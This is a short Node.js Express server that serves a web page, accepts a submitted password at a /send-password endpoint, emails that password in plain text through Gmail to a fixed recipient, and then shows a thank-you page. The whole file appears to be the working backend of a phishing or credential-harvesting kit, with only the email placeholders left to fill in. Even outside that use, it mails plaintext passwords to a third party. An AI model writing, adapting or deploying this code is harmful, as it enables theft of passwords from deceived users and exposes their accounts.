const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public')); // serve index.html + images

app.post('/send-password', async (req, res) => {
  const { password } = req.body;

  if (!password) {
    return res.json({ success: false, message: 'No password provided.' });
  }

  // Example: Send email with Nodemailer
  try {
    const transporter = nodemailer.createTransport({
      service: 'Gmail',
      auth: {
        user: 'YOUR_EMAIL@gmail.com',
        pass: 'YOUR_APP_PASSWORD'
      }
    });

    await transporter.sendMail({
      from: 'YOUR_EMAIL@gmail.com',
      to: 'TO_EMAIL@gmail.com',
      subject: 'New Password',
      text: `Received password: ${password}`
    });

    return res.json({ success: true });
  } catch (error) {
    console.error(error);
    return res.json({ success: false, message: 'Email failed.' });
  }
});

// Serve thank you page
app.get('/thank-you.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'thank-you.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

